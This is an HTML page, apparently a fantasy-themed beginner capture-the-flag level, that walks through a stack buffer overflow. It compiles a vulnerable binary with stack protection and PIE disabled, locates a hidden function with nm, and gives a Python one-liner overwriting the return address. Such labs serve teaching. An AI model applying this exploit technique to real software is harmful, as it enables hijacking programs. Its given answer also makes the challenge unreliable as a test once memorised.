<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>The Quest of the Overloaded Bridge</title>
  <style>
    body { background: #111; color: #eee; font-family: monospace; padding: 2em; }
    h1 { color: #0ff; }
    code, pre { background:#181818; padding: 0.25em 0.5em; border-radius: 4px; }
    pre { display:block; overflow:auto; }
  </style>
</head>
<body>
  <h1>The Trial of the Rickety Bridge</h1>
  <p>
    Your adventure continues. Before you lies another rickety bridge, magically unstable and only able to hold a certain
    amount of weight before collapsing.
  </p>

  <h2>The Grand Spell</h2>
  <p>
    Overload the bridge so hard you don’t just cross it—you jump straight into the hidden
    <code>enter_the_treasure_room()</code> and claim the treasure scroll.
  </p>

  <h2>Your Spellbook</h2>
  <ul>
    <li>Scroll of Divination (find the treasure room’s address): <code>nm vuln | grep enter_the_treasure_room</code></li>
    <li>Crystal Ball (peek at the binary): <code>gdb ./vuln</code> (optional)</li>
    <li>Rune-Scribe’s Kit (confirm offset): <code>msf-pattern_create</code> / <code>msf-pattern_offset</code> (optional)</li>
    <li>Apprentice’s Wand (craft the payload): <code>python3 -c '...'</code></li>
  </ul>

  <h2>The Final Incantation</h2>
  <pre><code># 1) Compile with protections off (Linux x86_64)
gcc -O0 -fno-stack-protector -no-pie vuln.c -o vuln

# 2) Find the treasure room address
nm vuln | grep enter_the_treasure_room



# 3) Overflow to redirect execution (offset is 72 on this build)
python3 -c 'import struct,sys; sys.stdout.buffer.write(b"A"*72 + struct.pack("<Q", 0x401176))' | ./vuln
# Replace 0x401176 with your nm result.
</code></pre>

  <p><strong>Path to victory:</strong> <code>challenges/Binary_exploitation/level06_stackoverflow</code></p>
</body>
</html>
